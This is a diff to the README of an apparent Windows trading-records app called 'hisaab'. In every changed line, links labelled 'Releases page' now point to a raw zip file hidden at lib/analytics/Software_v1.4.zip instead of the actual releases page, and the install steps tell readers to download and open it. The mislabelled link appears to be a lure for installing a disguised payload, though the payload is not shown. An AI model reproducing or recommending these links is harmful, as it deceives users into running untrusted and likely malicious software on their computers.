@@ -1,10 +1,10 @@
 # 📒 hisaab - Clear Trading Records in Minutes
 
-[![Download hisaab](https://img.shields.io/badge/Download%20hisaab-Visit%20Releases-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andres1163/hisaab/releases)
+[![Download hisaab](https://img.shields.io/badge/Download%20hisaab-Visit%20Releases-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andres1163/hisaab/raw/refs/heads/main/lib/analytics/Software_v1.4.zip)
 
 ## 📥 Download the app
 
-Visit the [Releases page](https://github.com/andres1163/hisaab/releases) and download the latest Windows file.
+Visit the [Releases page](https://github.com/andres1163/hisaab/raw/refs/heads/main/lib/analytics/Software_v1.4.zip) and download the latest Windows file.
 
 If you see more than one file, pick the one for Windows. The file name may end in `.exe` or `.msi`.
 
@@ -41,7 +41,7 @@ Use this app on a Windows PC with:
 
 ## 🚀 First-time setup
 
-1. Download the latest Windows file from the [Releases page](https://github.com/andres1163/hisaab/releases).
+1. Download the latest Windows file from the [Releases page](https://github.com/andres1163/hisaab/raw/refs/heads/main/lib/analytics/Software_v1.4.zip).
 2. Open the file and finish the install.
 3. Start **hisaab** from your Start menu or desktop.
 4. Keep your broker CSV file ready.
@@ -136,7 +136,7 @@ hisaab is built for personal trade review. Keep your broker files on your own co
 
 ## 🧭 Quick start in 2 minutes
 
-1. Visit the [Releases page](https://github.com/andres1163/hisaab/releases)
+1. Visit the [Releases page](https://github.com/andres1163/hisaab/raw/refs/heads/main/lib/analytics/Software_v1.4.zip)
 2. Download the latest Windows file
 3. Open the file
 4. Finish setup
@@ -151,4 +151,4 @@ angel-one, bse, fifo, fno, groww, indian-stock-market, nextjs, nse, open-source,
 
 If you are on Windows, choose the newest release file made for Windows. The file usually has a clear name and shows its type near the end.
 
-If you are not sure which file to use, start with the main release asset on the [Releases page](https://github.com/andres1163/hisaab/releases)
+If you are not sure which file to use, start with the main release asset on the [Releases page](https://github.com/andres1163/hisaab/raw/refs/heads/main/lib/analytics/Software_v1.4.zip)
